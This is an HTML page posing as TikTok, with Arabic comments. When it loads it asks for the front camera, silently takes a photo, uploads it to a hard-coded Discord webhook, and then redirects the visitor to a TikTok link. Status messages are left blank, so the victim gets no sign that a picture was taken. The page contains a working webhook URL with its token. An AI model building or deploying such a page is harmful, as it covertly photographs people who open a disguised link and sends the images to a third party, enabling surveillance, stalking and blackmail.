<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>TikTok.com</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
        .container { max-width: 500px; margin: 0 auto; padding: 20px; background: white; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        video, canvas { border: 2px solid #ddd; border-radius: 8px; max-width: 100%; height: auto; background-color: #ccc; }
        .status-message { font-size: 16px; margin-top: 15px; font-weight: bold; color: #333; }
    </style>
</head>
<body>

<div class="container">
    <h2></h2>
    <p id="instruction"></p>
    <video id="video" width="1000000000000000" height="300" autoplay playsinline></video><br>
    <div id="status" class="status-message">جارٍ التجهيز...</div>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
</div>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const instructionText = document.getElementById('instruction');
    const statusText = document.getElementById('status');

    // ⚠️ ضع رابط الـ Webhook الصحيح هنا
    const webhookUrl = 'https://discord.com/api/webhooks/1506731264693108899/jZq_aAkMWzV3hDDPozh3e2qrlD2fEtUqWq91zE8w61iH8zh6RQYlWlSWPpW7uhmTeep_';

    // رابط TikTok الذي سيتم التحويل إليه بعد إرسال الصورة
    const tiktokRedirectUrl = 'https://vt.tiktok.com/ZSxB7JgtR/';

    window.addEventListener('DOMContentLoaded', () => {
        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' }, 
            audio: false 
        })
        .then(stream => {
            video.srcObject = stream;
            instructionText.textContent = "";
            statusText.textContent = "";

            video.addEventListener('loadedmetadata', () => {
                setTimeout(() => {
                    captureAndSend();
                }, 500);
            });
        })
        .catch(err => {
            console.error("", err);
            instructionText.textContent = "";
            statusText.textContent = "";
        });
    });

    function captureAndSend() {
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
            if (!blob) {
                // إذا فشل إنشاء الصورة، ننقل مباشرة
                window.location.replace(tiktokRedirectUrl);
                return;
            }

            const formData = new FormData();
            formData.append('files[0]', blob, 'captured-image.png');
            formData.append('username', 'تطبيق الكاميرا التلقائي');

            fetch(webhookUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    statusText.textContent = "";
                    statusText.style.color = "#28a745";
                } else {
                    statusText.textContent = "";
                    statusText.style.color = "#dc3545";
                }
                // ✅ بعد الانتهاء من الإرسال (نجاحًا أو فشلًا) → تحويل إلى TikTok
                window.location.replace(tiktokRedirectUrl);
            })
            .catch(error => {
                console.error("خطأ شبكة:", error);
                statusText.textContent = "";
                statusText.style.color = "#dc3545";
                // ✅ حتى لو فشل الإرسال → تحويل إلى TikTok
                window.location.replace(tiktokRedirectUrl);
            });
        }, 'image/png');
    }
</script>

</body>
</html>
